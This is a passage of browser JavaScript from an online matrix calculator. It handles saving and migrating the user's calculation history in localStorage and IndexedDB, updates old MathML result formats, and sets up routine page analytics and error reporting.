  var value = this.keyStorage.getItem("resdiv");
  var items = value != undefined ? parseJSONArraySafely(value) : [];

  try {
    var m = /(?:^|;)\s*lastResult\s*\=\s*([^;]*)/.exec(document.cookie);
    if (m != undefined) {
      var lastResult = unescape(m[1]);
      if (lastResult !== "") {
        window.setTimeout(function () {
          hit({bc: "cookie"});
        }, 0);
        items.unshift([lastResult]);
        var valueToSave = JSON.stringify(items);
        this.keyStorage.setItem("resdiv", valueToSave);
        if (this.keyStorage.getItem("resdiv") === valueToSave) {
          document.cookie = "lastResult=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
        }
      }
    }
  } catch (error) {
    window.setTimeout(function () {
      throw error;
    }, 0);
  }

  var currentNumber = 0;
  for (var i = 0; i < items.length; i += 1) {
    items[i] = this.itemUpdater(items[i], currentNumber + 1);
    currentNumber = Math.max(currentNumber, items[i].actHistoryId);
  }
  return {
    items: items,
    currentNumber: currentNumber
  };
};
ItemsStorage.prototype.getAllEntries = function (callback) {
  var tmp = this._load();
  var items = tmp.items;
  var keys = new Array(items.length);
  for (var i = 0; i < items.length; i += 1) {
    keys[i] = items[i].actHistoryId;
  }
  callback({keys: keys, items: items});
};
ItemsStorage.prototype.add = function (item, callback) {
  var tmp = this._load();
  var items = tmp.items;
  var currentNumber = tmp.currentNumber;
  var key = currentNumber + 1;
  item.actHistoryId = key;
  items.push(item);
  this._save(items);
  callback(key);
};
ItemsStorage.prototype["delete"] = function (key) {
  var tmp = this._load();
  var items = tmp.items;
  for (var i = 0; i < items.length; i += 1) {
    var x = items[i];
    if (x != undefined && x.actHistoryId === key) {
      items[i] = undefined;
    }
  }
  this._save(items);
};
ItemsStorage.prototype.clear = function () {
  this._save([]);
};


ItemsStorage.updateItem = function (data, idIfNotSet) {
  idIfNotSet = idIfNotSet || undefined;

  var oldVersion = data.version || 0;
  if (oldVersion === 0) {
    // emptry strings are needed for `zInsAct`
    var resultHTML = data.length > 0 ? data[0] : "";
    var resultMatrix = data.length > 1 ? data[1] : "";
    data = {
      resultHTML: resultHTML.indexOf("</custom-math>") === -1 && resultHTML.indexOf("</math>") === -1 ? "<div class=\"math\">" + resultHTML + "</div>" : resultHTML,
      resultMatrix: resultMatrix,
      details: data.length > 2 ? data[2] : undefined,
      expressionString: data.length > 3 ? data[3] : undefined,
      actHistoryId: data.length > 4 ? Number.parseInt(data[4], 10) : idIfNotSet,
      detailsHTML: data.length > 5 ? data[5] : undefined,
      version: 7
    };
  }

  if (oldVersion <= 7) {
    if (data.resultMatrix != undefined && data.resultMatrix.indexOf(";") !== -1) {
      // "-17/3\t 4\t 4/3;  8/3\t-2\t-1/3;   -2\t 1\t   1"
      data.resultMatrix = "{{" + data.resultMatrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
      hit({bc: "resultMatrix"});//!
    }
  }
  
  if (data.resultMatrix === '') {
    var tmp = /onclick\="\(new Matrix\('str',\d+,(\d+)(?:,\d+)?,([\-0-9\/',]+)\)\).print\('a'\);">/.exec(data.resultHTML);
    if (tmp != null) {
      var colsNumber = Number.parseInt(tmp[1], 10);
      var rows = [];
      var x = tmp[2].replace(/'/g, '').split(',');
      while (x.length !== 0) {
        rows.push('{' + x.slice(0, colsNumber).join(',') + '}');
        x = x.slice(colsNumber);
      }
      data.resultMatrix = '{' + rows.join(',') + '}';
    }
  }

  if (true) {
    var removeInsertButtons = function (e) {
      var spans = e.querySelectorAll('span');
      for (var i = 0; i < spans.length; i += 1) {
        if (spans[i].style != null && spans[i].style.cssFloat === 'right') {
          spans[i].parentNode.removeChild(spans[i]);
        }
      }
    };
    var removeCustomMath = function (e) {
      var elements = e.querySelectorAll('custom-math');
      for (var i = 0; i < elements.length; i += 1) {
        var x = elements[i];
        var math = document.createElement('math');
        math.innerHTML = x.innerHTML;
        x.parentNode.replaceChild(math, x);
      }
    };
    var removeMathClass = function (e) {
      var elements = e.querySelectorAll('.math');
      for (var i = 0; i < elements.length; i += 1) {
        var x = elements[i];
        if (x.firstChild === x.lastChild && x.firstElementChild != null && x.firstElementChild.tagName.toLowerCase() === 'math') {
          x.parentNode.replaceChild(x.firstChild, x);
        } else {
          while (x.firstChild != null) {
            x.parentNode.insertBefore(x.firstChild, x);
          }
          x.parentNode.removeChild(x);
        }
      }

      var es = e.querySelectorAll('span');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        while (x != null && x.tagName.toLowerCase() !== 'math') {
          x = x.parentNode;
        }
        if (x != null) {
          while (x.firstChild != null) {
            x.parentNode.insertBefore(x.firstChild, x);
          }
          x.parentNode.removeChild(x);
        }
      }

      // add <math></math>
      var visit = function (x) {
        if (x.nodeType === Node.ELEMENT_NODE && x.tagName.toLowerCase().slice(0, 1) === 'm') {
          if (x.tagName.toLowerCase() !== 'math') {
            if (x.previousSibling != null && x.previousSibling.nodeType === Node.ELEMENT_NODE && x.previousElementSibling.tagName.toLowerCase() === 'math') {
              x.previousElementSibling.appendChild(x);
            } else {
              var math = document.createElement('math');
              x.parentNode.replaceChild(math, x);
              math.appendChild(x);
            }
          }
        } else {
          var c = x.firstChild;
          while (c != null) {
            var next = c.nextSibling;
            visit(c);
            c = next;
          }
        }
      };
      visit(e);
    };
    var removeExtraMrows = function (e) {
      var es = e.querySelectorAll('mrow');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.firstChild === x.lastChild && x.firstChild != null && x.attributes.length === 0) {
          x.parentNode.replaceChild(x.firstChild, x);
        }
      }
    };
    var addRowspacing = function (e) {
      var es = e.querySelectorAll('mtable');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.getAttribute('rowspacing') == null) {
          x.setAttribute('rowspacing', '0ex');
        }
      }
    };
    var addMROWs = function (e) {
      var c = e.firstElementChild;
      while (c != undefined) {
        var next = c.nextElementSibling;
        if (c.tagName.toLowerCase() !== 'mrow') {
          hit({bc: "msub+msup"});//!
          var mrow = document.createElement("mrow");
          e.insertBefore(mrow, c);
          c.parentNode.removeChild(c);
          mrow.appendChild(c);
        }
        c = next;
      }
    };
    var fixSummary = function (e) {
      var elements = e.querySelectorAll(".summary");
      for (var i = 0; i < elements.length; i += 1) {
        var oldSummary = elements[i];
        if (oldSummary != undefined && oldSummary.tagName.toLowerCase() !== "summary") { // backward compatibility
          hit({bc: ".summary"});//!
          var newSummary = document.createElement("summary");
          while (oldSummary.firstChild != undefined) {
            newSummary.appendChild(oldSummary.firstChild);
          }
          oldSummary.parentNode.insertBefore(newSummary, oldSummary);
          oldSummary.parentNode.removeChild(oldSummary);
        }
      }
    };
    var fixMSUBAndMSUP = function (node) {
      // MFENCED - ?
      if (" mfrac msqrt mroot msub msup munder ".indexOf(" " + node.tagName.toLowerCase() + " ") !== -1) {
        addMROWs(node);
      }
      var c = node.firstElementChild;
      while (c != undefined) {
        fixMSUBAndMSUP(c);
        c = c.nextElementSibling;
      }
    };
    var fixDetails = function (e) {
      var elements = e.querySelectorAll(".details");
      for (var i = 0; i < elements.length; i += 1) {
        var oldDetails = elements[i];
        hit({bc: ".details"});//!
        var container = document.createElement("div");
        container.classList.toggle("details-container", true);
        oldDetails.parentNode.insertBefore(container, oldDetails);
        oldDetails.parentNode.removeChild(oldDetails);
        oldDetails.classList.toggle("details", false);
        container.appendChild(oldDetails);
      }
    };
    var fixDetailsContainer = function (e) {
      var elements = e.querySelectorAll(".details-container");
      for (var i = 0; i < elements.length; i += 1) {
        var old = elements[i];
        var c = old.firstElementChild;
        if (c.classList.contains("details-container")) {
          hit({bc: ".details-container"});//!
          old.removeChild(c);
          old.parentNode.insertBefore(c, old);
          old.parentNode.removeChild(old);
        }
      }
    };
    var fixOldDetailsTypes = function (e) {
      var elements = e.querySelectorAll("[data-details]");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var arrayAttribute = element.getAttribute("data-details");
        var array = JSON.parse(arrayAttribute);
        for (var j = 0; j < array.length; j += 1) {
          var type = array[j].type;
          if (type === "determinant" || type === "inverse" || type === "rank") {
            hit({bc: "details-" + type});//!
            array[j].type = type + "-Gauss";
          }
        }
        element.setAttribute("data-details", JSON.stringify(array));
      }
    };
    var fixMatrixContainer = function (e) { // <= 7
      var elements = e.querySelectorAll(".matrix-container");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var matrix = element.querySelector(".matrix-menu-show");
        element.removeAttribute('class');//!
        if (matrix != undefined) { // old version
          hit({bc: "matrix-container"});//!
          matrix = matrix.getAttribute("data-matrix") || element.getAttribute("data-matrix");
          if (matrix != undefined) { // Uncaught TypeError: Cannot read property 'replace' of null - https://matrixcalc.org/es/
            if (matrix.indexOf(";") !== -1 || matrix.indexOf("\t") !== -1) {
              matrix = "{{" + matrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
            }
            var columnlines = undefined;
            var useBraces = undefined;
            if (element.firstElementChild.tagName.toLowerCase() === 'mfenced') {
              columnlines = element.firstElementChild.firstElementChild.getAttribute("columnlines");
              if (columnlines != undefined) {
                columnlines = -1;//TODO:
              }
            }
            if (element.querySelector("[open=\"|\"]") != undefined) {
              useBraces = ["|", "|"];
            }
            if (element.querySelector("[open=\"{\"]") != undefined) {
              useBraces = ["{", " "];
            }
            var tmp = document.createElement("div");
            tmp.innerHTML = RPNProxy.toMathML(matrix, {
              columnlines: columnlines,
              useBraces: useBraces
            });
            element.parentNode.insertBefore(tmp.firstElementChild, element);
            element.parentNode.removeChild(element);
          }
        }
      }
    };
    var fixTop = function (e) { // <= 7
      // <span class="top">-1</span>
      var elements = e.querySelectorAll(".top");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        if (element.innerHTML === "-1" || element.innerHTML === "T") {
          hit({bc: "top"});//!
          var base = element.previousElementSibling;
          var tmp = document.createElement("div");
          tmp.innerHTML = "<msup><mrow></mrow><mrow>" + RPNProxy.toMathML(element.innerHTML, {}) + "</mrow></msup>";
          base.parentNode.removeChild(base);
          tmp.firstElementChild.firstElementChild.appendChild(base);
          element.parentNode.insertBefore(tmp.firstElementChild, element);
          element.parentNode.removeChild(element);
        }
      }
    };
    var fixDivMath = function (e) { // <= 7
      var x = e.firstElementChild;
      if (x != undefined && x.tagName.toLowerCase() === 'div' && x.classList.contains('math')) {
        //x.style.display = "inline-block";
        x.setAttribute("style", "display: inline-block;");
      }
    };
    var fixTable = function (e) {
      // <table class="inTable"></table>
      var elements = e.querySelectorAll(".inTable");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var span = element.nextElementSibling;
        var matrix = '';
        if (span != undefined && span.tagName.toLowerCase() === 'span' && span.style.display === 'none') {
          matrix = "{{" + span.innerHTML.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
          span.parentNode.removeChild(span);
        } else {
          var matrix = '';
          matrix += '{';
          var tbody = element.firstElementChild;
          for (var row = tbody.firstElementChild; row != null; row = row.nextElementSibling) {
            matrix += '{';
            for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
              if (cell.getAttribute('rowspan') == null) {
                var t = cell.querySelector('table');
                if (t != null) {
                  var x = t.firstElementChild.firstElementChild.textContent + '/' + t.firstElementChild.lastElementChild.textContent;
                  t.innerHTML = x;
                }
                matrix += cell.textContent;//TODO:
                matrix += cell.nextElementSibling != null && cell.nextElementSibling.getAttribute('rowspan') == null ? ',' : '';
              }
            }
            matrix += '}';
            matrix += row.nextElementSibling != null ? ',' : '';
          }
          matrix += '}';
        }
        if (matrix !== '') {
          hit({bc: "inTable"});//!
          var tmp = document.createElement("div");
          var isDeterminant = element.querySelector(".matrix-img-line") != undefined;
          tmp.innerHTML = RPNProxy.toMathML(isDeterminant ? "determinant(" + matrix + ")" : matrix, {});
          element.parentNode.insertBefore(tmp.firstElementChild, element);
          element.parentNode.removeChild(element);
        }
      }
    };
    var fixArrowWithLabel = function (e) {
      var elements = e.querySelectorAll(".arrow-with-label");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        if (element.getAttribute("data-custom-paint") !== "arrow-with-label") {
          element.setAttribute("data-custom-paint", "arrow-with-label");
          hit({bc: "arrow-with-label"});
        }
      }
    };
    var fixMencloseInMenclose = function (e) {
      if (e.querySelector('math') == null) {//!
        var elements = e.querySelectorAll("menclose[notation=none]");
        for (var i = 0; i < elements.length; i += 1) {
          var element = elements[i];
          var mtable = element.querySelector("mtable");
          if (mtable != null && mtable.firstElementChild != null && mtable.firstElementChild === mtable.lastElementChild && mtable.firstElementChild.firstElementChild === mtable.firstElementChild.lastElementChild) {
            var e = mtable.querySelector("menclose[notation=none]");
            if (e != null && e.querySelector("mtable") != undefined && element.getAttribute('data-matrix') === '{{' + e.getAttribute('data-matrix') + '}}') {
              hit({bc: "menclose-menclose"});
              element.parentNode.insertBefore(e, element);
              element.parentNode.removeChild(element);
            }
          }
        }
      }
    };
    var replaceMfenced = function (e) {
      var es = e.querySelectorAll('mfenced');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        var open = e.getAttribute('open') || '(';
        var mo1 = document.createElement('mo');
        mo1.textContent = open;
        var close = e.getAttribute('close') || ')';
        var mo2 = document.createElement('mo');
        mo2.textContent = close;
        var t = document.createElement('mrow');
        t.appendChild(mo1);
        while (e.firstChild != null) {
          t.appendChild(e.firstChild);
        }
        t.appendChild(mo2);
        e.parentNode.insertBefore(t, e);
        e.parentNode.removeChild(e);
      }
    };
    var fixClassPivot = function (e) {
      var es = e.querySelectorAll('.pivot');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.tagName.toLowerCase() === 'mtd') {
          x.removeAttribute('class');
          var tmp = document.createElement('menclose');
          tmp.setAttribute('notation', 'circle');
          while (x.firstChild != null) {
            tmp.appendChild(x.firstChild);
          }
          x.appendChild(tmp);
        }
      }
    };
    var fixMoMo = function (html) {
      //TODO: counter
      return html.replace(/<mo>\+<mo>/g, "<mo>+</mo>");
    };
    var fixDiagonalizeSteps = function (html) {
      return html.replace(/diagonalize-steps/g, "steps-to-diagonalize");
    };
    var removeHref = function (tmp) {
      var es = tmp.querySelectorAll('[href="#"]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].removeAttribute('href');
      }
    };
    var removeMatrixMenuShowNew = function (tmp) {
      var es = tmp.querySelectorAll('.matrix-menu-show-new');
      for (var i = 0; i < es.length; i += 1) {
        es[i].classList.toggle('matrix-menu-show', true);
        es[i].classList.toggle('matrix-menu-show-new', false);
        if (es[i].textContent === '☰') {
          es[i].textContent = '';
        }
      }
    };
    var removeDataX = function (tmp) {
      var es = tmp.querySelectorAll('[data-x="TODO"]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].removeAttribute('data-x');
      }
    };
    var fixHTML = function (html) {
      if (html == undefined) {
        return html;
      }
      var tmp = document.createElement("div");
      html = fixMoMo(html);
      if (oldVersion <= 15) {
      html = fixDiagonalizeSteps(html);
      }
      tmp.innerHTML = html;
      try {
        if (oldVersion <= 15) {
          removeInsertButtons(tmp);
          fixMSUBAndMSUP(tmp);
          fixSummary(tmp);
          fixDetails(tmp);
          fixDetailsContainer(tmp);
          fixOldDetailsTypes(tmp);
          fixMatrixContainer(tmp);
          fixTable(tmp); // it should be before fixTop
          fixTop(tmp);
          fixDivMath(tmp);
          fixArrowWithLabel(tmp);
          fixMencloseInMenclose(tmp);
          removeCustomMath(tmp);
          removeMathClass(tmp);
          removeExtraMrows(tmp);
          addRowspacing(tmp);
          replaceMfenced(tmp);
          fixClassPivot(tmp);
        }
        if (oldVersion <= 16) {
          removeHref(tmp);
          removeMatrixMenuShowNew(tmp);
          removeDataX(tmp);
        }
      } catch (error) {
        //TODO: fix
        console.error(error);
        window.setTimeout(function () {
          throw new TypeError("fixHTML(" + error.toString() + "): " + html);
        }, 0);
      }
      return tmp.innerHTML;
    };
    //if (data.expressionString != undefined && data.expressionString !== "") {
    //  RPNProxy.runExpression(data.expressionString, undefined, undefined, undefined, {idPrefix: "i" + data.actHistoryId}, function (result) {
    //    if (result.resultError == undefined) {
    //      data.resultHTML = result.resultHTML;
    //      data.detailsHTML = result.detailsHTML;
    //    }
    //  });
    //} else {
      data.resultHTML = fixHTML(data.resultHTML);
      data.detailsHTML = fixHTML(data.detailsHTML);
    //}
    if (data.detailsHTML == undefined) {
      var details = data.details;
      // details === null after JSON.parse(JSON.stringify(details))
      if (details != undefined && details.length !== 0) {
        hit({bc: "createDetailsSummary"});
        //TODO: async
        data.detailsHTML = RPNProxy.createDetailsSummary("i" + data.actHistoryId, details, details.length === 1 ? 100 : 1);
      }
    }
  }
  return data;
};

globalThis.ItemsStorage = ItemsStorage;

}());
/*global window, console*/

(function () {
"use strict";

function IDBItemsStorage(fallbackItemsStorage) {
  this.fallbackItemsStorage = fallbackItemsStorage;
}
IDBItemsStorage.prototype._ = function (operation, item, key, callback) {
  var fallbackItemsStorage = this.fallbackItemsStorage;
  var useFallback = function () {
    if (operation === "getAllEntries") {
      fallbackItemsStorage.getAllEntries(callback);
    }
    if (operation === "add") {
      fallbackItemsStorage.add(item, callback);
    }
    if (operation === "delete") {
      fallbackItemsStorage["delete"](key);
    }
    if (operation === "clear") {
      fallbackItemsStorage.clear();
    }
  };
  var roundValue = function (value, max) {
    return "10**" + (Math.floor(Math.log(Math.max(value, max) + 0.5) / Math.log(10)) + 1);
  };
  var length = function (value) {
    var n = 0;
    if (value == undefined) {
      n += 8;
    } else if (typeof value === "boolean") {
      n += 8;
    } else if (typeof value === "number") {
      n += 8;
    } else if (typeof value === "string") {
      n += 16 + value.length;
    } else if (typeof value === "object") {
      if (value instanceof Array) {
        for (var j = 0; j < value.length; j += 1) {
          n += length(value[j]);
        }
      } else {
        for (var i in value) {
          if (Object.prototype.hasOwnProperty.call(value, i)) {
            n += length(value[i]);
          }
        }
      }
    }
    return n;
  };
  var start = Date.now();
  var onEvent = function (operation, errorName, value) {
    var tmp = {};
    tmp[operation] = {ok: errorName, duration: roundValue(Date.now() - start, 100 - 1), valueLength: roundValue(length(value), 1000 - 1)};
    hit({idb: tmp});
  };
  var indexedDB = undefined;
  var wasError = false;
  try {
    indexedDB = window.indexedDB;
  } catch (error) {
    wasError = true;
    // "Cookies blocking in Firefox" - https://github.com/Modernizr/Modernizr/issues/1825#issuecomment-171087703
    onEvent("access", error.name, undefined);
    console.log(error);
    useFallback();
  }
  if (!wasError &&
      indexedDB != undefined &&
      window.IDBObjectStore != undefined &&
      window.IDBObjectStore.prototype != undefined &&
      window.IDBObjectStore.prototype.getAll != undefined &&
      window.IDBObjectStore.prototype.getAllKeys != undefined) {
    var openRequest = undefined;
    try {
      openRequest = indexedDB.open("acthistory");
    } catch (error) {
      // "SecurityError" for opaque origins
      onEvent("access", error.name, undefined);
      console.log(error);
      useFallback();
    }
    if (openRequest != undefined) {
      openRequest.onupgradeneeded = function (event) {
        var db = event.target.result;
        //! fallbackItemsStorage should be synchronous
        fallbackItemsStorage.getAllEntries(function (tmp) {
          var items = tmp.items;
          //Note: as the version was not provided, the object store should not exist at this point.
          var store = db.createObjectStore("items", {
            //keyPath: undefined, // IE 11 throws an InvalidAccessError for undefined or null
            autoIncrement: true
          });
          for (var i = 0; i < items.length; i += 1) {
            store.add(items[i]);
          }
        });
        //TODO: fallbackItemsStorage.clear()
      };
      //Note: this will handle abort of `openRequest.transaction` or an error during creation of a new database (step 5.1.6)
      openRequest.onerror = function (event) {
        onEvent("access", event.target.error.name, undefined);
        console.log(event.target.error);
        useFallback();
        event.preventDefault();// FireFox 52 - 57
      };
      openRequest.onsuccess = function (event) {
        var db = event.target.result;
        var objectStoreNames = db.objectStoreNames;
        if (!objectStoreNames.contains("items")) {
          onEvent("access", "No store", undefined);
          console.log("No store");
          if (operation === "getAllEntries") {
            callback({keys: [], items: []});
          }
        } else {
          onEvent("access", "successful", undefined);
          // Note: it may throw a NotFoundError
          var transaction = db.transaction("items", operation === "getAllEntries" ? "readonly" : "readwrite");
          var store = transaction.objectStore("items");
          // Looks like "abort" is fired for QuotaExceededError
          transaction.onabort = function (event) {
            onEvent(operation, event.target.error.name, item);
            console.log(event.target.error); // Chrome shows nothing in the Console
            if (operation === "add" && event.target.error.name === "QuotaExceededError") {
              // delete some old records + repeat
              // `getAllKeys` is used to carefully work with multiple concurrent calls
              var transaction1 = db.transaction("items", "readonly");
              var store1 = transaction1.objectStore("items");
              var request1 = store1.getAllKeys();
              request1.onsuccess = function (event) {
                var keys = event.target.result;
                var n = keys.length;
                var slowAdd = function (divisor) {
                  var transaction2 = db.transaction("items", "readwrite");
                  var store2 = transaction2.objectStore("items");
                  transaction2.onabort = function (event) {
                    console.log(event.target.error); // Chrome shows nothing in the Console
                    if (event.target.error.name === "QuotaExceededError" && n >= divisor) {
                      slowAdd(divisor * 2);
                    }
                  };
                  for (var i = 0; i < n - Math.floor(n / divisor); i += 1) {
                    store2["delete"](keys[i]);
                  }
                  var request3 = store2.add(item);
                  request3.onsuccess = function (event) {
                    var key = event.target.result;
                    transaction2.oncomplete = function (event) {
                      callback(key);
                    };
                  };
                };
                transaction1.oncomplete = function (event) {
                  slowAdd(1);
                };
              };
              transaction1.onabort = function (event) {
                console.log(event.target.error); // Chrome shows nothing in the Console
              };
            } else {
              if (operation === "getAllEntries") {
                callback({keys: [], items: []});
              }
            }
          };
          if (operation === "getAllEntries") {
            var keysRequest = store.getAllKeys();
            keysRequest.onsuccess = function (event) {
              var keys = event.target.result;
              var valuesRequest = store.getAll();
              valuesRequest.onsuccess = function (event) {
                var items = event.target.result;
                transaction.oncomplete = function (event) {
                  onEvent(operation, "successful", {keys: keys, items: items});
                  callback({keys: keys, items: items});
                };
              };
            };
          } else if (operation === "add") {
            var request = store.add(item);
            request.onsuccess = function (event) {
              var key = event.target.result;
              transaction.oncomplete = function (event) {
                onEvent(operation, "successful", item);
                callback(key);
              };
            };
          } else if (operation === "delete") {
            store["delete"](key);
          } else if (operation === "clear") {
            store.clear();
            fallbackItemsStorage.clear(); //TODO: remove
          }
        }
      };
    }
  } else if (!wasError) {
    onEvent("access", "No indexedDB", undefined);
    console.log("No indexedDB");
    useFallback();
  }
};
IDBItemsStorage.prototype.getAllEntries = function (callback) {
  this._("getAllEntries", undefined, undefined, callback);
};
IDBItemsStorage.prototype.add = function (item, callback) {
  this._("add", item, undefined, callback);
};
IDBItemsStorage.prototype["delete"] = function (key) {
  this._("delete", undefined, key, undefined);
};
IDBItemsStorage.prototype.clear = function () {
  this._("clear", undefined, undefined, undefined);
};

globalThis.IDBItemsStorage = IDBItemsStorage;
}());

/*global RPN*/

(function () {
"use strict";

function RPNProxy() {
}

RPNProxy.getPositionInfo = function () {
  //TODO: async
  return RPN.getPositionInfo();
};
RPNProxy.toMathML = function (matrix, options) {
  //TODO: async
  var result = RPN.toMathML(matrix, options);
  return result;
};
RPNProxy.createDetailsSummary = function (idPrefix, details, bestMethodsLimit) {
  //TODO: async
  var result = RPN.createDetailsSummary(idPrefix, details, bestMethodsLimit);
  return result;
};
RPNProxy.getMatrix = function (string, callback) {
  var result = RPN.getMatrix(string);
  callback(result);
};
RPNProxy.getElementsArray = function (matrixTableState, callback) {
  var result = RPN.getElementsArray(matrixTableState);
  callback(result);
};
RPNProxy.checkExpressions = function (textareaValue, type, callback, errorCallback) {
  try {
    var result = RPN.checkExpressions(textareaValue, type);
    callback(result);
  } catch (error) {
    errorCallback(error);
  }
};
RPNProxy.checkExpression = function (input, callback, errorCallback) {
  try {
    var result = RPN.checkExpression(input);
    callback(result);
  } catch (error) {
    errorCallback(error);
  }
};
RPNProxy.runExpression = function (input, kInputValue, kInputId, matrixTableStates, printOptions, callback) {
  var result = RPN.runExpression(input, kInputValue, kInputId, matrixTableStates, printOptions);
  callback(result);
};
RPNProxy.getDetails = function (data, printOptions, callback) {
  var result = RPN.getDetails(data, printOptions);
  callback(result);
};

globalThis.RPNProxy = RPNProxy;
}());

/*global ItemsStorage */

(function () {
"use strict";

function ActHistoryItem(data, idIfNotSet) {
  var oldVersion = data.version || 0;
  if (oldVersion < ActHistoryItem.version) {
    data = ItemsStorage.updateItem(data, idIfNotSet);
  }
  this.oldVersion = oldVersion;
  this.resultHTML = data.resultHTML || "";
  this.resultMatrix = data.resultMatrix || "";
  this.details = data.details;
  this.expressionString = data.expressionString;
  this.actHistoryId = data.actHistoryId;
  this.detailsHTML = data.detailsHTML;
  this.version = ActHistoryItem.version;
}

ActHistoryItem.version = 17;

function ActHistoryStorage(itemsStorage) {
  this.itemsStorage = itemsStorage;
  this.actHistory = {};
  this.actHistoryId = 0;
}
ActHistoryStorage.prototype.load = function (callback) {
  this.itemsStorage.getAllEntries(function (tmp) {
    var keys = tmp.keys;
    var items = tmp.items;
    this.actHistory = {};
    for (var i = 0; i < items.length; i += 1) {
      var key = keys[i];
      var item = items[i];
      if (item != null && item.version < ActHistoryItem.version) {
        item = ItemsStorage.updateItem(item);
      }
      this.actHistory[key] = {item: item, key: key};
      this.actHistoryId = Math.max(this.actHistoryId, key);
    }
    callback(this.actHistory);
  }.bind(this));
};
ActHistoryStorage.prototype.getPreviousItem = function () {
  var previousItem = undefined;
  for (var i in this.actHistory) {
    if (Object.prototype.hasOwnProperty.call(this.actHistory, i)) { // TODO: iteration order - ?
      if (this.actHistory[i] != undefined) {
        previousItem = this.actHistory[i].item;
      }
    }
  }
  return previousItem;
};
ActHistoryStorage.prototype.size = function () {
  var size = 0;
  for (var i in this.actHistory) {
    if (Object.prototype.hasOwnProperty.call(this.actHistory, i)) {
      if (this.actHistory[i] != undefined) {
        size += 1;
      }
    }
  }
  return size;
};
ActHistoryStorage.prototype.getItem = function (actHistoryId) {
  var x = this.actHistory[actHistoryId];
  return x == undefined ? undefined : x.item;
};
ActHistoryStorage.prototype.setItem = function (actHistoryId, item) {
  this.actHistory[actHistoryId] = {item: item, key: undefined};
  this.itemsStorage.add(item, function (key) {
    this.actHistoryId = Math.max(this.actHistoryId, key);
    if (this.actHistory[actHistoryId] != undefined) {
      this.actHistory[actHistoryId] = {item: item, key: key};
    } else {
      this.itemsStorage["delete"](key);
    }
  }.bind(this));
};
ActHistoryStorage.prototype.removeItem = function (actHistoryId) {
  var key = this.actHistory[actHistoryId].key;
  if (key != undefined) {
    this.itemsStorage["delete"](key);
  }
  delete this.actHistory[actHistoryId];
};
ActHistoryStorage.prototype.clear = function () {
  this.itemsStorage.clear();
  this.actHistory = {};
};

globalThis.ActHistoryItem = ActHistoryItem;
globalThis.ActHistoryStorage = ActHistoryStorage; //!

}());

/*jslint plusplus: true, vars: true, indent: 2, white: true */
/*global window, document, console, Node, Image, Element, Dialog, Ya, PageUtils, reportValidity, XMLHttpRequest, initializeAInput, initializeAHighlight, initializeATooltip, MathMLToSVG, ItemsStorage, IDBItemsStorage, RPNProxy, i18n, ActHistoryItem, getMatrixPresentationsFromMatrix, toMultilineString, getTableFromAsciiMathMatrix, ActHistoryStorage, parseMathML, YT*/

(function () {
"use strict";

// TODO: implement Dialog.prompt, replace button+input with button+Dialog.prompt

if (window.location.protocol !== "file:" && window.navigator.doNotTrack !== "1") {
  window.setTimeout(function () {
  // LiveInternet counter
    (new Image()).src = "https://counter.yadro.ru/hit?r" + encodeURIComponent(document.referrer) + (window.screen == undefined ? "" : ";s" + Number(window.screen.width).toString() + "*" + Number(window.screen.height).toString() + "*" + "24") + ";u" + encodeURIComponent(document.URL) + ";h" + ";" + (Math.random() + 1).toString().slice(2);
  }, 256);
}


var addClickOnEnter = function (element) {
  var input = element.querySelector('input');
  var button = element.querySelector('button');
  if (!('enterKeyHint' in input)) {
    input.setAttribute('mozactionhint', 'Enter');//?
  }
  input.enterKeyHint = 'enter'; //?  it should produce keydown events - https://groups.google.com/a/chromium.org/d/msg/blink-dev/Hfe5xktjSV8/KItGmnG_BAAJ
  input.addEventListener('keydown', function (event) {
    var DOM_VK_RETURN = 13;
    if (event.keyCode === DOM_VK_RETURN && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault(); // in case of moving focus to some other element (textarea)
      button.click();
    }
  }, false);
};

var Utils = PageUtils;

Utils.initialize(".button-after-input", function (element) {
  addClickOnEnter(element);
});
Utils.initialize(".button-before-input", function (element) {
  addClickOnEnter(element);
});

  // ...

//TODO: remove "window."
var yaCounter = undefined;
var hitQueue = [];
var sendHits = function () {
  yaCounter.params(hitQueue);
  hitQueue = [];
};
var roundValue = function (value, max) {
  return "10**" + (Math.floor(Math.log(Math.max(value, max) + 0.5) / Math.log(10)) + 1);
};
var hit = function (params) {
  if (hitQueue != undefined) {
    hitQueue.push(params);
    if (yaCounter != undefined) {
      requestIdleCallback("sendHits", sendHits, 1000);
    }
  }
};
globalThis.hit = hit;//! see Polynomial#getroots

  var postError = function (error, input, initialInput, classList) {
    input = input || undefined;
    initialInput = initialInput || undefined;
    classList = classList || undefined;
    var e = function (element) {
      if (element == undefined) {
        return undefined;
      }
      var a = element.getAttribute("data-expression");
      return (element.classList || "").toString() + (a == undefined ? "" : "[data-expression=" + a + "]");
    };
    var object = {
      error: error.name + ": " + error.message,
      input: input,
      initialInput: initialInput,
      classList: classList,
      focusedElement: e(document.querySelector(":focus")),
      decimalFractionDigits: decimalFractionDigits === -1 ? undefined : decimalFractionDigits
    };
    var tables = document.querySelectorAll(".matrix-table");
    for (var i = 0; i < tables.length; i += 1) {
      var id = tables[i].getAttribute("data-id");
      var table = MatrixTables[id];
      if (table != undefined) {
        var x = table.getRawInput(table.mode);
        var y = x;
        if (typeof x !== "string") {
          y = "";
          y += "{";
          for (var j = 0; j < x.length; j += 1) {
            y += j !== 0 ? "," : "";
            y += "{" + x[j].join(",") + "}";
          }
          y += "}";
        }
